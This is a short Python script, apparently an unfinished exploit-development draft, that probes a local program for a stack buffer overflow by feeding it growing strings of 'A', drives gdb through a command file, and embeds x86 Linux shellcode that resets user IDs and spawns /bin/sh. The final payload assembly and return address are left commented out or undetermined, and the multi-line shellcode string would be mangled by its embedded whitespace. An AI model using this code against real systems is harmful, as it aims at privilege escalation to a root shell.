import os
import sys

def main():
  args = sys.argv[1]
  i=1
  string = ""

  #find the buffer size
  while True:
    string = 'A'*i
    output_stream = os.popen(f"%s %s" % (args, string))
    output = output_stream.read()
    if output == "":
      break
    i += 1

  #write text file with commands to run in debugger
  #to develop: find the memory address for exploitation
  with open("gdb_commands.txt", "w") as f:
    f.write(f"run $(python3 -c \"print('A'*%s)\")\n" % i)
    #f.write("disas main")
    #or use objdump to find breakpoint
    #f.write("x/200xb $esp")
    f.write("quit")
    f.close()

  #run shell code that executes gdb
  os.system("./test.sh")

  #accomodate shell code and return address size
  i -= 46 + 4

  shellcode = '''\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b
          \x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b
        \x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff
            \x2f\x62\x69\x6e\x2f\x73\x68'''
  #memory address where the buffer starts in little endian

  #exploit = 'A'*i + shellcode + memory address"
  #os.system(args + exploit)

main()
